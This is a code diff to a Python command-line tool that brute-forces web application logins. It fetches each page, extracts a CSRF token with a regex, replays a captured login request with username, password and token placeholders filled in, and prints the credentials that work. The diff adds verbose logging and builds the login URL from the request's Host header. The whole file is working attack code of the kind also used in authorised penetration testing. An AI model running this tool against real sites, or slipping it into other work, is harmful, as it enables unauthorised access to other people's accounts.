@@ -1,13 +1,16 @@
 import requests
 import argparse
 import re
+from urllib.parse import urlparse
 
 
-def brute(url, login_request, headers, allow_redirects, proxies, username, password, token_regex, status_str, status_str_neg):
+def brute(verbose, url, login_url, login_request, headers, allow_redirects, proxies, username, password, token_regex, status_str, status_str_neg):
     csrf_token = None
     cookies = None
 
     # Issue a GET request and retrieve the CSRF-token
+    if verbose:
+        print(f"[*] Requesting {url} for CSRF-token...")
     with requests.get(url, allow_redirects=allow_redirects, proxies=proxies) as response:
         body = response.text
         cookies = response.cookies
@@ -16,8 +19,10 @@ def brute(url, login_request, headers, allow_redirects, proxies, username, passw
         match = re.search(token_regex, body)
         if match:
             csrf_token = match.group(1)
+            if verbose:
+                print(f"[+] Found CSRF-token: {csrf_token}")
         else: # Abort if we can"t find the CSRF-token
-            print(f"[-] No CSRF-token found. Login request for username: '{username}' and password '{password}' was cancelled.")
+            print(f"[-] No CSRF-token found. Login request for username: '{username}' and password '{password}' was cancelled. Aborting...")
             return False
 
     # Replace placeholders in HTTP headers
@@ -29,10 +34,12 @@ def brute(url, login_request, headers, allow_redirects, proxies, username, passw
     request_body = login_request["body"].replace("^USER^", username).replace("^PASS^", password).replace("^CSRF^", csrf_token)
 
     # Issue a login request with the CSRF-token
+    if verbose:
+        print(f"[*] Issue login request to {login_url} - Username: {username}, Password: {password}")
     success = False
     with requests.request(
         login_request["method"],
-        url,
+        login_url,
         headers=login_request["headers"],
         cookies=cookies,
         data=request_body,
@@ -51,7 +58,9 @@ def brute(url, login_request, headers, allow_redirects, proxies, username, passw
                 success = True
 
     if success:
-        print(f"Success! Username: {username}, Password: {password}")
+        print("==========[ Success ]==========")
+        print(f"Username: {username}")
+        print(f"Password: {password}")
         return True
 
     return False
@@ -73,14 +82,22 @@ def main(args):
         request = f.read()
 
         headers, body = request.split("\n\n", 1)
-        _, headers = headers.split("\n", 1)
-        method, url = request.split(" ", 1)
-
-        headers_dict = {}
-        for header in headers.split("\n")[1:]:
-            key, value = header.split(": ", 1)
-            headers_dict[key] = value
+        first_line, headers = headers.split("\n", 1)
+        method, uri, http = first_line.split(" ", 2)
         
+        host = None
+        headers_dict = {}
+        for header in headers.split("\n"):
+            key, value = header.split(": ", 1)
+            if key != "Host":
+                headers_dict[key] = value
+            else:
+                host = value
+
+        # The protocol for the login request is taken from the supplied url
+        proto = urlparse(args.url).scheme
+        login_url = proto + "://" + host + uri 
+
         login_request["method"] = method
         login_request["headers"] = headers_dict
         login_request["body"] = body
@@ -97,7 +114,9 @@ def main(args):
     for username in usernames:
         for password in passwords:
             success = brute(
+                args.verbose,
                 args.url,
+                login_url,
                 login_request,
                 headers,
                 args.allow_redirects,
@@ -132,6 +151,7 @@ def parse_args():
     parser.add_argument("-t", "--token-regex", help="Regex for CSRF-token. The CSRF-token is set as the first group of a potential match. Example: 'token=\"(.*?)\"'", required=True)
     parser.add_argument("-ar", "--allow-redirects", help="Allow redirects", action="store_true")
     parser.add_argument("--proxy", help="Proxy URL")
+    parser.add_argument("-v", "--verbose", help="Verbose", action="store_true")
 
     username_group = parser.add_mutually_exclusive_group()
     username_group.add_argument("-l", "--username", help="Single username for login")
